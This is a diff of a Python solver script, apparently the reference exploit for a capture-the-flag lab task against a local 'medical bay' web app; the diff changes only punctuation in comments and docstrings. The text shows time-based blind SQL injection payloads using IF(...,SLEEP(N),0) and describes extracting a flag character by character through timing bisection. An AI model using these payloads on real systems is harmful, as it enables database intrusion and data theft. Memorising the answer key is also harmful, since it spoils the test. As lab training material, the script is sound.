@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-"""solvers/p1_5.py — Task 1.5 "Zevil Island Medical Bay" canonical exploit.
+"""solvers/p1_5.py, Task 1.5 "Zevil Island Medical Bay" canonical exploit.
 
 The status-lookup route builds its query with raw string concatenation:
 
@@ -7,23 +7,23 @@ The status-lookup route builds its query with raw string concatenation:
 
 and renders exactly one thing back, always: a fixed "status checked." log
 line, whether the id matched a real patient, matched nothing, or made the
-query outright error. Unlike p1_4's Silent Room (still one visible bit —
+query outright error. Unlike p1_4's Silent Room (still one visible bit:
 PASS or FAIL) there is no token at all here to read: the response body is
 byte-for-byte identical no matter what happened server-side. The only
-channel left is *how long* the request took — a conditional SLEEP() folded
+channel left is *how long* the request took, a conditional SLEEP() folded
 into the injected condition via `IF(condition, SLEEP(N), 0)` makes a true
 condition measurably slower than a false one, even though both produce the
 exact same page.
 
 Note on observed timing: the vulnerable WHERE clause (`id='...' OR
 IF(condition, SLEEP(N), 0)`) is non-sargable, so MariaDB full-scans
-`patients` and evaluates IF(...) once per row — with 4 seed rows, a true
+`patients` and evaluates IF(...) once per row, with 4 seed rows, a true
 condition's SLEEP(N) fires up to 4 times per request, so the real
 elapsed time for a "slow" answer is ~4x the configured SLEEP_SECONDS
 below, not 1x. See the comment above SLEEP_SECONDS for the live numbers
 that confirm this.
 
-This is a real, live extraction against the running stack — every
+This is a real, live extraction against the running stack, every
 character below is recovered by actually timing the oracle, not hardcoded
 or simulated. The expected flag is only used for the final assertion.
 """
@@ -40,19 +40,19 @@ BASE = os.environ.get("SEIYAKU_BASE", "http://localhost:8000")
 EXPECTED_FLAG = "SEIYAKU{time_tells_all}"
 
 # Generous upper bound so the walk doesn't depend on foreknowledge of the
-# exact flag length/charset — just a plausible bound for a SEIYAKU{...} flag.
+# exact flag length/charset, just a plausible bound for a SEIYAKU{...} flag.
 MAX_LEN = 64
 ASCII_LOW = 32   # space
 ASCII_HIGH = 126  # '~'
 
 # --- timing tuning -----------------------------------------------------
 # SLEEP_SECONDS is the *per-row* delay passed to IF(condition, SLEEP(N),
-# 0) — NOT the observed total. The vulnerable query's WHERE clause is
+# 0), NOT the observed total. The vulnerable query's WHERE clause is
 # `id='...' OR IF(condition, SLEEP(N), 0)`: that OR is non-sargable (no
 # index can satisfy it), so MariaDB falls back to a full table scan of
 # `patients` and evaluates the IF(...) once per row it scans. With this
 # seed's `patients` table holding 4 rows, a true condition therefore
-# fires SLEEP(N) up to 4 times per request — observed elapsed time for a
+# fires SLEEP(N) up to 4 times per request, observed elapsed time for a
 # true condition is ~4 x SLEEP_SECONDS, confirmed live (SLEEP(0.1) ->
 # ~0.44s, SLEEP(0.5) -> ~2.03s, SLEEP(1.2) -> ~4.84s). This is a real,
 # well-known MySQL/MariaDB blind-SQLi nuance (row-count multiplication of
@@ -81,10 +81,10 @@ def oracle(patient_id: str) -> tuple[bool, float]:
     """Send one injected `id` value, return (is_slow, elapsed_seconds).
 
     is_slow=True means the injected condition evaluated true (the SLEEP()
-    fired); is_slow=False means it evaluated false (or the query errored —
+    fired); is_slow=False means it evaluated false (or the query errored,
     both read identically, fast). Anything that isn't a normal 200 with
     the expected marker text is treated as a hard failure of the solver
-    itself, not folded into the boolean — that would silently corrupt the
+    itself, not folded into the boolean, that would silently corrupt the
     walk.
     """
     start = time.monotonic()
@@ -95,7 +95,7 @@ def oracle(patient_id: str) -> tuple[bool, float]:
     resp.raise_for_status()
     if MARKER not in resp.text:
         raise RuntimeError(
-            f"unexpected response shape for id={patient_id!r} — missing "
+            f"unexpected response shape for id={patient_id!r}, missing "
             f"marker text, response may no longer look like a silent "
             f"status-checked page"
         )
@@ -108,10 +108,10 @@ def confirm_injection_and_silence() -> None:
 
     `' OR IF(1=1,SLEEP(N),0)-- -` forces the condition true (slow);
     `' OR IF(1=2,SLEEP(N),0)-- -` forces it false (fast). Both must render
-    the exact same marker text — no PASS/FAIL, no error, nothing — and the
+    the exact same marker text (no PASS/FAIL, no error, nothing), and the
     only observable difference must be elapsed time.
     """
-    print("[p1_5] step 0 — confirm injection point + silent (timing-only) oracle")
+    print("[p1_5] step 0, confirm injection point + silent (timing-only) oracle")
 
     true_payload = f"' OR IF(1=1,SLEEP({SLEEP_SECONDS}),0)-- -"
     slow, t_true = oracle(true_payload)
@@ -132,7 +132,7 @@ def confirm_injection_and_silence() -> None:
         )
 
     # A deliberately malformed payload (unbalanced quote, no comment to
-    # neutralize the trailing literal) must read as fast/silent too — not
+    # neutralize the trailing literal) must read as fast/silent too, not
     # as anything visibly or temporally different from an honest false.
     malformed_payload = f"' OR IF(1=1,SLEEP({SLEEP_SECONDS}),0)"
     slow, t_malformed = oracle(malformed_payload)
@@ -185,7 +185,7 @@ def main() -> int:
     print(f"[p1_5] target: {BASE}/p1/medbay")
     print(
         f"[p1_5] per-row SLEEP={SLEEP_SECONDS}s (observed ~4x due to the "
-        f"4-row patients table's non-sargable OR — see module docstring), "
+        f"4-row patients table's non-sargable OR, see module docstring), "
         f"threshold={THRESHOLD_SECONDS}s"
     )
 
@@ -196,7 +196,7 @@ def main() -> int:
         print("[p1_5] FAIL")
         return 1
 
-    print("[p1_5] step 1 — discover secret length via LENGTH() + timing bisection")
+    print("[p1_5] step 1, discover secret length via LENGTH() + timing bisection")
     try:
         length = discover_length()
     except Exception as exc:
@@ -209,7 +209,7 @@ def main() -> int:
         print("[p1_5] FAIL")
         return 1
 
-    print("[p1_5] step 2 — walk the secret char-by-char via SUBSTRING()/ASCII() + timing bisection")
+    print("[p1_5] step 2, walk the secret char-by-char via SUBSTRING()/ASCII() + timing bisection")
     chars: list[str] = []
     try:
         for pos in range(1, length + 1):
